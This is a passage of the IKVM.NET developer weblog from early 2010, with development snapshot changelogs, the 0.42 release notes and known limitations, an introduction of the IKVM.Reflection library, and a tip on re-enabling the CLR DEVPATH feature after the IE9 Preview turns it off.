		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 02 April 2010</h2></div>
<div class="newsItems"><a name="a58509510-d06a-4646-bf00-abff6beb0b6b"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've integrated <A href="http://blogs.sun.com/darcy/entry/openjdk_6_b18_source_bundle">OpenJDK 6 b18</A>. If you're building IKVM from source, you need to download <A href="http://www.frijters.net/openjdk6-b18-stripped.zip">openjdk6-b18-stripped.zip</A>.</P>
<P>Changes:</P>
<UL>
<LI>Integrated OpenJDK 6 b18.</LI>
<LI>Fixed IKVM.Reflection bug in version number handling (for version parts &gt; 32K).</LI>
<LI>Added support for generic parameter custom attributes to IKVM.Reflection (this is missing from June 2006 ECMA CLI spec).</LI>
<LI>Fixed IKVM.Reflection Type.FullName bug. Nested types can also have a namespace (not in the C# sense, but in the CLR sense).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3744.zip">ikvmbin-0.43.3744.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/02/2010 06:11:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=58509510-d06a-4646-bf00-abff6beb0b6b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=58509510-d06a-4646-bf00-abff6beb0b6b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 29 March 2010</h2></div>
<div class="newsItems"><a name="a4b316144-43d5-441a-9e44-c79edece3fd6"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>It's been a while and enough changes have accumulated to warrant a new development snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Volker implemented dumping a list of threads when Ctrl-Break is pressed (Windows only).</LI>
<LI>Fixed class loader caching in CallerID (thanks to Mainsoft for reporting this).</LI>
<LI>Added workaround to ikvmc for Assembly.Location differing in case when the assembly is loaded from DEVPATH.</LI>
<LI>Added error handling to ikvmc -key: and -keyfile: options.</LI>
<LI>Added code gen optimization to remove some unnecessary explicit class initialization triggers.</LI>
<LI>Several IKVM.Reflection fixes/improvements.</LI>
<LI>Added support to IKVM.Reflection for mcs specific AssemblyBuilderAccess flag (0x800 aka COMPILER_ACCESS) to allow access to members of unbaked TypeBuilders.</LI>
<LI>Added hack to ikvmc to automatically load OpenJDK assemblies from the same location as OpenJDK.Core (when a non-default OpenJDK.Core assembly is specified).</LI>
<LI>Introduced a base class for intrisified AtomitcReferenceFieldUpdaters. This reduces the size of the generates classes somewhat and allows for a public type to represent all intrinsified instances (instead of the HideFromJava nested type).</LI>
<LI>Intrinsified ThreadLocal (under specific circumstances).</LI>
<LI>Fix for bug <A href="http://sourceforge.net/tracker/?func=detail&amp;aid=2946842&amp;group_id=69637&amp;atid=525264">#2946842</A>.</LI>
<LI>Removed ../../openjdk6-b16 path from response files.</LI>
<LI>Fixed ikvmstub to not export generic type definitions, because the resulting class is final | abstract and that (intentionally) isn't legal.</LI>
<LI>Fixed ClassLoader to not allow unitialized class loader to be used as parent.</LI>
<LI>Replaced incorrect usages of Type.IsArray with ReflectUtil.IsVector().</LI>
<LI>Added workaround for Mono bug <A href="http://bugzilla.novell.com/show_bug.cgi?id=583669">#583669</A>.</LI>
<LI>Fixed bug in handling of unrecognized time zones.</LI>
<LI>When running on .NET 3.5 or later, use TimeZoneInfo.Id to identify timezone, because that maps better to the Win32 names that the Java name mapping is based on.</LI>
<LI>Fix for partial trust regression in assembly class loader initialization.</LI>
<LI>Partial trust: File.listRoots() now uses Environment.GetLogicalDrives() instead of Directory.GetLogicalDrives(). Both methods are semantically identical, but the former requires EnvironmentPermission(Unrestricted = true) and the latter SecurityPermission(UnmanagedCode = true). We also now swallow a SecurityException, should it occur.</LI>
<LI>Partial trust: Getting the host name now falls back to "localhost" if we don't have permission to query the name (or if anything else causes GetHostName to fail).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3736.zip">ikvmbin-0.43.3736.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/29/2010 09:00:57 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4b316144-43d5-441a-9e44-c79edece3fd6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4b316144-43d5-441a-9e44-c79edece3fd6">Comments [3]</a>
		
		<br clear="all">
	</div>
</div><a name="aa0854ee6-7dc3-40b0-850e-cd1727070e3d"></a><div class="entry">
	<h3 class="entryTitle">IE9 Preview disables CLR DEVPATH feature</h3>
	<div class="entryBody">
		<P>(This is not related to IKVM.NET, but since I spent several hours tracking this down, I thought I'd write it up here in the hope anyone else struggling with this will find it.)</P>
<P>One of the lesser known (development) features of the CLR is the ability to override the regular Fusion assembly loading rules by setting the <A href="http://msdn.microsoft.com/en-us/library/cskzh7h6.aspx">DEVPATH</A> environment variable (and adding an entry to the machine.config to enable this).</P>
<P>It turns out that this feature can be disabled by setting <CODE>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DevOverrideEnable</CODE> to 1.</P>
<P>When the IE9 Platform Preview is installed it adds this value to the registry.</P>
<P>To re-enable DEVPATH, set the value to 0 or delete it.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/29/2010 08:20:22 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a0854ee6-7dc3-40b0-850e-cd1727070e3d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a0854ee6-7dc3-40b0-850e-cd1727070e3d">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 19 February 2010</h2></div>
<div class="newsItems"><a name="aac55cc6d-8a72-469b-98c6-84d19ec309b8"></a><div class="entry">
	<h3 class="entryTitle">0.42 Update 1 RC 1</h3>
	<div class="entryBody">
		<P>I fixed a major bug in the automagic .NET serialization support.</P>
<P>Changes:</P>
<UL>
<LI>Updated version to 0.42.0.5.</LI>
<LI>Fix for bug #<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=2946842&amp;group_id=69637">2946842</A>.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.42.0.5.zip">ikvmbin-0.42.0.5.zip</A><BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.42.0.5.zip">ikvm-0.42.0.5.zip</A>, <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/19/2010 09:40:08 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ac55cc6d-8a72-469b-98c6-84d19ec309b8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ac55cc6d-8a72-469b-98c6-84d19ec309b8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 29 January 2010</h2></div>
<div class="newsItems"><a name="a3f7b31fb-ff92-4604-a302-349a9ccad953"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've modified ikvmc to use IKVM.Reflection and largely rewritten ikvmstub to directly work with the ikvm internals instead of using the java reflection API. Both ikvmc and ikvmstub can now process assemblies independent from the .NET runtime they run on. This opens up the possibility to start investigating the possibility of Silverlight support.</P>
<P>Changes:</P>
<UL>
<LI>Drag-n-drop fix by Nat.</LI>
<LI>Fixed regression introduced in previous development snapshot, related to field accessors.</LI>
<LI>Removed caching of inner classes.</LI>
<LI>Fix for bug <A href="http://sourceforge.net/tracker/?func=detail&amp;aid=2908683&amp;group_id=69637&amp;atid=525264">#2908683</A>.</LI>
<LI>Various AWT fixes by Volker.</LI>
<LI>Changed JNI to use standard caller ID mechanism.</LI>
<LI>Various JNI optimizations.</LI>
<LI>Fixed <A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=41696">http://gcc.gnu.org/bugzilla/show_bug.cgi?id=41696</A></LI>
<LI>Fixed exception sorter bug exposed by recent Mono sorting change.</LI>
<LI>Fixed Thread.getAllStackTraces() to resume threads that it suspends.</LI>
<LI>Integrated new IKVM.Reflection implementation.</LI>
<LI>Added AllowMultiple = true to RemappedClassAttribute.</LI>
<LI>Fixed atomic update helper nested types to be invisible from Java.</LI>
<LI>Removed support for "ikvm.stubgen.serialver" property that is no longer needed now that ikvmstub doesn't use the runtime to generate stubs.</LI>
<LI>Removed pre-generated stub jars from cvs and modified build process to generate them during the build.</LI>
<LI>Removed "constant" instance field support (which was only used by ikvmstub and doesn't make any sense anyway).</LI>
<LI>Removed ReflectionOnly support from runtime. Now that ikvmstub no longer requires it, there's no good reason to allow Java code to see ReflectionOnly types.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3681.zip">ikvmbin-0.43.3681.zip</A><BR></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/29/2010 09:35:13 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3f7b31fb-ff92-4604-a302-349a9ccad953"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3f7b31fb-ff92-4604-a302-349a9ccad953">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 25 January 2010</h2></div>
<div class="newsItems"><a name="ad0dc2476-471b-45f3-96bf-a90bc2f5800b"></a><div class="entry">
	<h3 class="entryTitle">Introducing IKVM.Reflection</h3>
	<div class="entryBody">
		<P>In <A HREF="/PermaLink.aspx?guid=9b7ada92-88d7-45c7-be83-8e6f4f3ccb1b">November 2008</A> I introduced IKVM.Reflection.Emit, today I'm introducing IKVM.Reflection. It superseded IKVM.Reflection.Emit and also includes the ability to read managed assemblies. In addition, I've also added many other features that aren't directly needed for ikvmc, but are useful for other applications. Almost the complete reflection API has now been implemented and there are several API extensions to support managed PE features that reflection doesn't support (well).</P>
<P><B>Why?</B></P>
<P>When I started on IKVM.Reflection.Emit, it wasn't at all clear to me that it would be possible to re-implement the System.Reflection.Emit namespace without also re-implementing the System.Reflection namespace, but it turned out it was. I did run into a few snags, such as the inability to subclass Module and Assembly (this was fixed in .NET 4.0) and a couple of Mono bugs, but on the whole IKVM.Reflection.Emit was very successful. So why then re-implement the System.Reflection namespace as well? The main reasons are Silverlight and .NET 4.0. For ikvmc to be able to target versions of the runtime different from the one it is currently running on, it is necessary to avoid using System.Reflection, because System.Reflection can only ever work with the mscorlib version of the current runtime.</P>
<P><B>ikvmc &amp; ikvmstub</B></P>
<P>In the coming time, I plan on integrating IKVM.Reflection into ikvmc (most of the work for this has already been done, if you've been following the ikvm-commit list, you may have seen some changes go in and wondered why they are necessary) and ikvmstub (I haven't started on this yet). Currently, ikvmstub uses java reflection to expose members of the .NET types in an assembly. I chose this because it was the easiest way to make sure that what ikvmstub generated matched the ikvm runtime behavior (because it simply used the ikvm runtime to do the mapping). There are two downsides to this approach. The first is the same as mentioned above with ikvmc, you can only generate mscorlib stubs for the runtime you're currently running on. The second is more philosophical, it introduces a cycle in the build process. To build the IKVM.OpenJDK.*.dll assemblies, you need mscorlib.jar and System.jar, but to generate these stubs you need a compiled class library. To solve both these issues, I plan to rewrite ikvmstub to work directly on the internal ikvm runtime representations (with conditional compilation, like ikvmc does).</P>
<P><B>Features</B></P>
<P>This list is not exhaustive, but here are some interesting features of IKVM.Reflection (that are not in System.Reflection):</P>
<UL>
<LI>There is no AppDomain global state. Everything is contained in an instance of the <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/reflect/Universe.cs?view=markup">IKVM.Reflection.Universe</A> class.</LI>
<LI>No thread safety. If you want thread safety, you'll have to lock the universe object during every operation.</LI>
<LI>You can choose what version of mscorlib to load in the universe (using Universe.LoadMscorlib()) and by implementing a Universe.AssemblyResolve handler you can decide the framework assembly <A href="http://msdn.microsoft.com/en-us/library/db7849ey(VS.71).aspx">unification policy</A>.</LI>
<LI>Support for querying and emitting .NET 2.0 style declarative security.</LI>
<LI>Support for defining unmanaged resources from a byte array (in .NET, AssemblyBuilder.DefineUnmanagedResources(byte[]) is broken, only the overload that accepts a filename works).</LI>
<LI>The ability to read and emit .NET 1.1, .NET 2.0 and .NET 4.0 assemblies (while running on, for example, .NET 2.0).</LI>
<LI>Full support for vararg calling convention.</LI>
<LI>Support for reading field RVA data (e.g. for the fields that are used by the C# compiler to initialize arrays).</LI>
<LI>The ability to enable/disable "exception block assistance", or get "clever" assistance.</LI>
<LI>Support for querying methodimpl mappings.</LI>
<LI>Support for reference, pointer and array types with custom modifiers (this CLR feature is used by C++/CLI).</LI></UL>
<P><B>Missing Features</B></P>
<P>Some things are still missing. The most notable being the Emit differences. The emit code was based on the IKVM.Reflection.Emit code and likewise still lacks some of the querying support (for baked types), although the new code is much better than the code in IKVM.Reflection.Emit.dll in this respect.</P>
<P>Here's a list of methods that can still throw a NotImplementedException:</P>
<UL>
<LI>FieldBuilder.__GetDataFromRVA()</LI>
<LI>ModuleBuilder.ResolveType()</LI>
<LI>ModuleBuilder.ResolveMethod()</LI>
<LI>ModuleBuilder.ResolveField()</LI>
<LI>ModuleBuilder.ResolveMember()</LI>
<LI>ModuleBuilder.ResolveString()</LI>
<LI>ModuleBuilder.__ResolveOptionalParameterTypes()</LI>
<LI>ModuleBuilder.GetArrayMethod()</LI>
<LI>GenericTypeParameterBuilder.BaseType</LI>
<LI>GenericTypeParameterBuilder.__GetDeclaredInterfaces()</LI>
<LI>GenericTypeParameterBuilder.GetGenericParameterConstraints()</LI>
<LI>GenericTypeParameterBuilder.GenericParameterAttributes</LI>
<LI>TypeBuilder.CreateType() (when invoked a second time)</LI>
<LI>TypeBuilder.__GetDeclaredFields()</LI>
<LI>TypeBuilder.__GetDeclaredEvents()</LI>
<LI>TypeBuilder.__GetDeclaredProperties()</LI>
<LI>ISymbolDocumentWriter.SetCheckSum()</LI>
<LI>ISymbolDocumentWriter.SetSource()</LI>
<LI>Most methods in ISymbolWriter</LI>
<LI>ManifestResourceInfo.ResourceLocation (for resources located in another assembly)</LI>
<LI>ManifestResourceInfo.ReferencedAssembly</LI>
<LI>ManifestResourceInfo.FileName</LI>
<LI>MethodBase.GetMethodBody() (if the method data contains unexpected sections)</LI>
<LI>Type.IsAssignableFrom()</LI></UL>
<P>Missing members:</P>
<UL>
<LI>Module.GetSignerCertificate()</LI>
<LI>Type.GUID</LI>
<LI>ParameterBuilder.GetToken()</LI>
<LI>PropertyBuilder.PropertyToken</LI>
<LI>MethodBuilder.Signature</LI>
<LI>ConstructorBuilder.Signature</LI>
<LI>MethodBuilder.SetSymCustomAttribute()</LI>
<LI>ModuleBuilder.SetSymCustomAttribute()</LI>
<LI>ConstructorBuilder.SetSymCustomAttribute()</LI>
<LI>ModuleBuilder.DefineResource()</LI>
<LI>AssemblyBuilder.ModuleResolve</LI>
<LI>Assembly.GetManifestResourceStream()</LI>
<LI>Assembly.GetSatelliteAssembly()</LI>
<LI>Assembly.GetFile()</LI>
<LI>Assembly.GetFiles()</LI>
<LI>MethodBuilder.SetMarshal() (obsolete, use MarshalAsAttribute instead)</LI>
<LI>ParameterBuilder.SetMarshal() (obsolete, use MarshalAsAttribute instead)</LI>
<LI>FieldBuilder.SetMarshal() (obsolete, use MarshalAsAttribute instead)</LI>
<LI>ModuleBuilder.DefineUnmanagedResource(byte[]) (because it is broken)</LI>
<LI>AssemblyBuilder.DefineUnmanagedResource(byte[]) (because it is broken)</LI>
<LI>MethodBuilder.CreateMethodBody()</LI>
<LI>Everything that doesn't make sense in a ReflectionOnly context.</LI></UL>
<P>Concepts that are not implemented:</P>
<UL>
<LI>Most metadata tokens returned by Emit objects are not properly typed (and can't be used for anything, other than comparing them against other metadata tokens).</LI>
<LI>When defining debugging symbols, a single method can only point to a single source document.</LI>
<LI>All type/member lookup operations are case sensitive.</LI>
<LI>Implementing a custom System.Reflection.Binder is not supported.</LI>
<LI>Modules with unsorted metadata tables are not supported.</LI>
<LI>When Type.GetMethods() (or __GetDeclaredMethods) is called on Array types it throws a NotImplementedException, instead of returning the special array accessor methods.</LI>
<LI>Managed function pointer types are not supported. Like System.Reflection, they are returned as System.IntPtr instead.</LI></UL>
<P><B>Linker Prototype</B></P>
<P>To see if I did miss any important CLR features, I wrote a prototype assembly linker. It is pretty capable, but should not be confused for something that is usable for anything other than exploring. I've used it with C++/CLI (compiled with /clr:pure) to test the more esoteric CLR features. The source for the linker prototype is in the zip linked to below.</P>
<P>The IKVM.Reflection source code is available in <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/reflect/">cvs</A>. If you just want the binary, the <A href="http://www.frijters.net/LinkerPrototype.zip">LinkerPrototype.zip</A> contains it.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/25/2010 08:28:20 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d0dc2476-471b-45f3-96bf-a90bc2f5800b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d0dc2476-471b-45f3-96bf-a90bc2f5800b">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 12 January 2010</h2></div>
<div class="newsItems"><a name="accbdcc69-bab1-467e-a694-33cc4eb5169d"></a><div class="entry">
	<h3 class="entryTitle">0.42 Update 1 RC 0</h3>
	<div class="entryBody">
		<P>Yesterday, I released 0.42 and as seemingly always happens a bug was reported right after that. So with that we're now on the road to the 0.42 Update 1 release. This is release candidate 0.<BR><BR>Changes:</P>
<UL>
<LI>Updated version to 0.42.0.4.</LI>
<LI>Added fix to mangle all artificial type names if they clash with Java type names in the same assembly.</LI>
<LI>Fix for <A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=41696">http://gcc.gnu.org/bugzilla/show_bug.cgi?id=41696</A>.</LI>
<LI><A href="https://sourceforge.net/mailarchive/message.php?msg_name=295e750a1001102223x4a3aa94av93e8938086ccb08b@mail.gmail.com">Fixed exception sorter</A> to be correct when invoked with two references to the same object.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.42.0.4.zip">ikvmbin-0.42.0.4.zip</A><BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.42.0.4.zip">ikvm-0.42.0.4.zip</A>, <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/12/2010 18:11:43 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ccbdcc69-bab1-467e-a694-33cc4eb5169d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ccbdcc69-bab1-467e-a694-33cc4eb5169d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 11 January 2010</h2></div>
<div class="newsItems"><a name="a75a5b8a3-7605-4f6f-a466-8d6c4632f7e3"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.42 Released</h3>
	<div class="entryBody">
		I've <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">released IKVM 0.42</A> to SourceForge. The binaries are identical to the ones in <A HREF="/PermaLink.aspx?guid=8ca44111-f200-4e14-8075-4aaedb8969f7">release candidate 3</A>.
<P><B>Release Notes</B></P>
<P>This document lists the known issues and incompatibilities.</P>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported. </LI>
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM. </LI>
<LI>JNI<BR>&nbsp;
<UL>
<LI>Only supported in the default AppDomain. </LI>
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention). </LI>
<LI>Cannot call string contructors on already existing string instances </LI>
<LI>A few limitations in Invocation API support<BR>&nbsp;
<UL>
<LI>The Invocation API is only supported when running on .NET. </LI>
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported. </LI>
<LI>JNI_GetDefaultJavaVMInitArgs not implemented </LI>
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred. </LI>
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR). </LI>
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL></LI>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL></LI>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError. </LI>
<LI>monitorenter / monitorexit cannot be used on unitialized this reference. </LI>
<LI>Floating point is not fully spec compliant. </LI>
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters). </LI>
<LI>Synchronized blocks are not async exception safe. </LI>
<LI>Ghost arrays don't throw ArrayStoreException when you store an object that doesn't implement the ghost interface. </LI>
<LI>Class loading is more eager than on the reference VM. </LI>
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses). </LI>
<LI>JSR-133 finalization spec change is not fully implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully, but this isn't implemented.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor. </LI>
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code). </LI>
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4). </LI>
<LI>Only code compiled in a single assembly fully obeys the JLS binary compatibility rules. </LI>
<LI>An assembly can only contain one resource with a particular name. </LI>
<LI>Passing incorrect command line options to ikvmc may result in an exception rather than a proper error messages.</LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK 6 build 16. Below is a list of divergences and IKVM specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>GNU Classpath implementation. Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>Partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.net</TD>
<TD>No IPv6 support implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.text.Bidi</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Partial implementation. JPEGs can be read and written, but there is no metadata support.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.swing</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.tools</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.jdbc.odbc</TD>
<TD>Implementation based on .NET ODBC managed provider.</TD></TR>
<TR>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Image content handlers not implemented.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.print, for example, means that the API is there but there is no back-end to provide the actual printing support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas.</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath). </LI>
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec). </LI>
<LI>java.lang.String.intern() strings are never garbage collected. </LI>
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics. </LI>
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown. </LI>
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread(). </LI>
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor. </LI>
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems. </LI>
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x64</TD>
<TD>Windows</TD></TR></TBODY></TABLE>
<P><BR><B>Partial Trust</B></P>
<P>There is experimental support for running in partial trust.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/11/2010 06:36:26 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=75a5b8a3-7605-4f6f-a466-8d6c4632f7e3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=75a5b8a3-7605-4f6f-a466-8d6c4632f7e3">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 07 December 2009</h2></div>
<div class="newsItems"><a name="a7036bafb-e65f-45f3-a333-5d0307d154f6"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
